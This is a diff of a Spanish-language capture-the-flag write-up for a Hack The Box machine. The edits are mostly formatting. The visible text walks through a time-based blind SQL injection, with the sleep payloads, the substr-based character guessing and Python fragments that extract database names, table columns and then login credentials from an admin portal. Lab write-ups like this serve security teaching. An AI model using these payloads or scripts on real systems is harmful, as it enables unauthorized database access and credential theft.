@@ -74,14 +74,17 @@ req = requests.post(login_url, data=data, headers = headers, verify=False)
 print(req.text)
 ```
 ----------------------------
+
 # Part 3: Blind sqli
 
 Probamos otro tipo de inyeccion (tiempo) -> ```' and sleep(5)-- -```  
 Ejecutamos el script y tarda cinco segundos en responder, eso esque hay una vulnerabilidad **time based blind sqli**  
 Las blind sqli se basan en la función substr:   
-> substr(‘palabra’, 1,1) -> “p”; substr(‘palabra’, 2,2) → “al”    
-> ```and if (substr(‘palabra’, 1,1)='p', sleep(5),1)-- -``` si la primera letra de 'palabra' es 'p', espera 5 segundos.  
+> `substr(‘palabra’, 1,1) -> “p”; substr(‘palabra’, 2,2)` → “al”    
+> `and if (substr(‘palabra’, 1,1)='p', sleep(5),1)-- -` si la primera letra de 'palabra' es 'p', espera 5 segundos.
+
 ## Averiguar el nombre de la base de datos actual:  
+
 ```python
 #!/bin/python3
 import requests, time, string
@@ -126,7 +129,9 @@ for i in range(10):
 	resultado += ", "
 ```
 Conseguimos las bases de datos **information_schema** y **admin**  
+
 ## Averiguar el nombre de las tablas de 'admin':  
+
 ```python
 caracteres = string.ascii_lowercase + "_"
 #caracteres = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
@@ -172,7 +177,9 @@ for i in range(10):
 	resultado += ", "
 ```
 Columnas -> **id**, **username**, **password** y **active**  
+
 ## Conseguir creds
+
 ```python
 caracteres = string.ascii_lowercase + "_" + string.digits + string.punctuation
 login_url = "https://admin-portal.europacorp.htb/login.php"
